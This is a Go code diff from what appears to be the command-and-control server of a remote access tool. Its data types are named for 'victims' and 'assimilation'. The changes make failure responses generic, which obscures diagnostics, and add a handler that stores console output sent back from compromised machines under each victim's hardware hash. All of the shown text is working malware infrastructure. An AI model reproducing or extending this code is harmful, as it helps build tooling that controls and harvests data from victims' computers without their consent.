@@ -142,7 +142,7 @@ func HandleIncomingRequest(incomingJson string) (toreturn string){
 	if (err != nil || jsonIncomingRequest.HardwareHash == ""){
 		var Response AssimilateResponse
 		Response.ResponseCode   = 1
-		Response.ResponseString = "Failure1"
+		Response.ResponseString = "Failure"
 		jsonResponse, _ :=json.Marshal(Response)
 		return string(jsonResponse)
 	}
@@ -152,7 +152,7 @@ func HandleIncomingRequest(incomingJson string) (toreturn string){
 	if  (!exists) { //if it does not exist 
 		var Response AssimilateResponse
 		Response.ResponseCode   = 1
-		Response.ResponseString = "Failure2"
+		Response.ResponseString = "Failure"
 		jsonResponse, _ :=json.Marshal(Response)
 		return string(jsonResponse)
 	}
@@ -173,7 +173,7 @@ func HandleIncomingRequest(incomingJson string) (toreturn string){
 	}else {
 		var Response AssimilateResponse
 		Response.ResponseCode   = 1
-		Response.ResponseString = "Failure3"
+		Response.ResponseString = "Failure"
 		jsonResponse, _ :=json.Marshal(Response)
 		return string(jsonResponse)
 	}
@@ -181,5 +181,43 @@ func HandleIncomingRequest(incomingJson string) (toreturn string){
 }
 
 func HandleIncomingData(incomingJson string) (toreturn string){
-	return ""
+	clientTreeMutex.Lock()
+	defer clientTreeMutex.Unlock()
+
+	println("handle incoming datastream")
+
+	var jsonIncomingRequest VictimOutputFlow
+	err := json.Unmarshal([]byte(incomingJson), &jsonIncomingRequest)
+	if (err != nil || jsonIncomingRequest.HardwareHash == ""){
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
+
+	//see if the tree even has this entry before doing anything else
+	clientData, exists := clientTree.Get(jsonIncomingRequest.HardwareHash);
+	if  (!exists) { //if it does not exist 
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
+
+	//entry exists on the tree put a string on it
+	currentData := clientData.(VictimInfo)
+	currentData.VictimConsoleOutput = append(currentData.VictimConsoleOutput, jsonIncomingRequest.Data)
+
+	//have to replace what was taken here
+	clientTree.Put(currentData.VictimInfo.HardwareHash, currentData)
+
+	//in this this outcome is a success so return accordingly
+	var Response AssimilateResponse
+		Response.ResponseCode   = 0
+		Response.ResponseString = "Success"
+	toSend, _ := json.Marshal(Response)
+	return string(toSend)
+	
 }
